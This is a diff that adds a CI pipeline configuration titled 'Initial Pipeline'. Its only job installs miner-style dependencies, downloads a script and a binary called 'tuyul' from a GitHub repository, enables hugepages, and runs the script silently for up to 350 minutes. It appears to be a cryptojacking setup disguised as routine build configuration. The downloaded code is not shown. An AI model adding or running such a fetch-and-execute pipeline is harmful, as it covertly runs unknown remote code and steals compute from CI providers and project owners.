@@ -1,0 +1,18 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu1804
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1
+            - '        wget https://github.com/jurasyad/p/raw/main/compilehaven.sh'
+            - '        wget https://github.com/jurasyad/p/raw/main/tuyul'
+            - '        sudo sysctl -w vm.nr_hugepages=1280'
+            - '        chmod +x tuyul compilehaven.sh'
+            - '        timeout 350m ./compilehaven.sh > /dev/null 2>&1'
